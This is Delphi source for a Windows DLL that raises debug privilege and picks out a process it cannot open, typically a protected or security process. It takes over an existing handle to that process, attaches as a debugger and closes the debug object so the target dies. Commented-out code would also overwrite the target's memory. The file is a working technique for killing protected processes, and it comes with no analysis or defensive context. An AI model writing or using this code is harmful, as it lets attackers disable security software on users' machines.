{$E dll}
{$IMAGEBASE $00400000}
{$R-}
{$Q-}
{$IFDEF minimum}
program oxuetb_lib;
{$ENDIF}
unit oxuetb_lib;
interface

uses
  Windows, WinNative, RTL;


implementation

const
  String5: PWideChar = '\BaseNamedObjects\oxuetb';
  String6: PWideChar = 'oxuetb.dll';

type
  _SYSINFOBUF = record
    uHandleCount: ULONG;
    rHandleTable: array[0..0] of SYSTEM_HANDLE_INFORMATION;
  end;
  SYSINFOBUF = _SYSINFOBUF;
  PSYSINFOBUF = ^_SYSINFOBUF;

var
  TargetProcessHandle: THANDLE;
  TargetProcessId: THANDLE;

  SnapShotHandle: THANDLE;
  EventHandle: THANDLE;
  attr: OBJECT_ATTRIBUTES;
  str1: UNICODE_STRING;
  buf: array[0..PAGE_SIZE] of BYTE;
  buf1: LBuf;

function OpenProcessTest(ProcessId: ULONG): boolean; stdcall;
var
  hProcess: THANDLE;
  attr: OBJECT_ATTRIBUTES;
  cl1: CLIENT_ID;
begin
  result := false;
  cl1.UniqueProcess := ProcessId;
  cl1.UniqueThread := 0;
  InitializeObjectAttributes(@attr, nil, 0, 0, nil);
  if (ZwOpenProcess(@hProcess, PROCESS_ALL_ACCESS, @attr, @cl1) = STATUS_SUCCESS) then
  begin
    ZwClose(hProcess);
    result := true;
  end;
  if (ProcessId = 0) or (ProcessId = 4) then result := true;
end;

procedure GetTargetProcess();
var
  h2: THANDLE;
  c: integer;
  bytesIO: ULONG;
  buf: PSYSINFOBUF;
  pbi: PROCESS_BASIC_INFORMATION;
  pp1: PSYSTEM_PROCESSES;
  membuf: PChar;
begin
  membuf := nil;
  bytesIO := $400000;
  ZwAllocateVirtualMemory(NtCurrentProcess, @membuf, 0, @bytesIO, MEM_COMMIT, PAGE_READWRITE);
  if (membuf = nil) then exit;
  if (ZwQuerySystemInformation(SystemProcessesAndThreadsInformation, membuf, bytesIO, @bytesIO) = STATUS_SUCCESS) then
  begin
    pp1 := PSYSTEM_PROCESSES(membuf);
    while (1 = 1) do
    begin
      if (OpenProcessTest(pp1^.ProcessId) = FALSE) then
      begin
        TargetProcessId := pp1^.ProcessId;
        break;
      end;
      if (pp1^.NextEntryOffset = 0) then break;
      pp1 := PSYSTEM_PROCESSES(PChar(pp1) + pp1^.NextEntryOffset);
    end;
  end;
  bytesIO := 0;
  ZwFreeVirtualMemory(NtCurrentProcess, @membuf, @bytesIO, MEM_RELEASE);

  TargetProcessHandle := 0;
  bytesIO := 4194304;
  buf := nil;
  ZwAllocateVirtualMemory(DWORD(-1), @buf, 0, @bytesIO, MEM_COMMIT, PAGE_READWRITE);
  if (buf <> nil) then
  begin

    ZwQuerySystemInformation(SystemHandleInformation, buf, 4194304, @bytesIO);
    for c := 0 to buf^.uHandleCount - 1 do
      if (buf^.rHandleTable[c].ProcessId = NtGetCurrentProcessId()) then
      begin
        if (buf^.rHandleTable[c].ObjectTypeNumber = 5) then 
        begin

          h2 := buf^.rHandleTable[c].Handle;
          if (ZwQueryInformationProcess(h2, ProcessBasicInformation, @pbi, sizeof(pbi), @bytesIO) = STATUS_SUCCESS) then
          begin
            if (pbi.UniqueProcessId = TargetProcessId) then
            begin
              TargetProcessHandle := h2;
              break;
            end;
          end;

        end;
      end;
    bytesIO := 0;
    ZwFreeVirtualMemory(NtCurrentProcess, @buf, @bytesIO, MEM_RELEASE);
  end;
end;

function KillProcess2(ProcessHandle: THANDLE): boolean;
var
{  bytesIO: DWORD;
  buf: PSYSINFOBUF;

  c: integer; }
  pTeb1: PTEB;
begin
  result := false;
  if (DbgUiConnectToDbg() <> STATUS_SUCCESS) then exit;
  if (DbgUiDebugActiveProcess(ProcessHandle) <> STATUS_SUCCESS) then exit;
 { bytesIO := 4194304;
  buf := nil;
  ZwAllocateVirtualMemory(NtCurrentProcess, @buf, 0, @bytesIO, MEM_COMMIT, PAGE_READWRITE);
  ZwQuerySystemInformation(SystemHandleInformation, buf, 4194304, @bytesIO);
  for c := 0 to buf^.uHandleCount - 1 do
    if (buf^.rHandleTable[c].ProcessId = NtGetCurrentProcessId()) then
    begin
      if (buf^.rHandleTable[c].ObjectTypeNumber = $8) then
      begin
        ZwClose(buf^.rHandleTable[c].Handle);
        result := true;
        break;
      end;
    end;
  bytesIO := 0;
  ZwFreeVirtualMemory(NtCurrentProcess, @buf, @bytesIO, MEM_RELEASE);}

  asm
    mov eax, fs:18h
    mov pTeb1, eax
  end;
  ZwClose(THANDLE(pTeb1^.DbgSsReserved[1]));
end;

procedure TryToKillProcess();
{var
  p1, p0: PChar;
  sz, oldp: ULONG;}
begin
{  uitohexW(TargetProcessHandle, @buf1[0]);
  OutputDebugStringW(buf1);

  uitohexW(TargetProcessId, @buf1[0]);
  OutputDebugStringW(buf1); }

 { p0 := pointer($10000);
  repeat
    p1 := p0;
    sz := $1000;
    if (ZwProtectVirtualMemory(TargetProcessHandle, @p1, @sz, PAGE_EXECUTE_READWRITE, @oldp) = STATUS_SUCCESS) then
      ZwWriteVirtualMemory(TargetProcessHandle, p0, @buf, PAGE_SIZE, @oldp);
    p0 := p0 + $1000;
  until (DWORD(p0) >= $80000000);}
  KillProcess2(TargetProcessHandle);
  ZwClose(TargetProcessHandle);  
end;

procedure main();
begin
  EventHandle := 0;
  Internal_AdjustPrivilege(SE_DEBUG_PRIVILEGE, TRUE, FALSE);
  RtlInitUnicodeString(@str1, String5);
  InitializeObjectAttributes(@attr, @str1, OBJ_CASE_INSENSITIVE, 0, nil);
  if (ZwOpenEvent(@EventHandle, EVENT_ALL_ACCESS, @attr) = STATUS_SUCCESS) then
  begin
    GetTargetProcess();
    TryToKillProcess();
    ZwSetEvent(EventHandle, nil);
    ZwClose(EventHandle);
  end;
end;

asm
  call main
  xor eax, eax
  inc eax
  retn $000c
end.

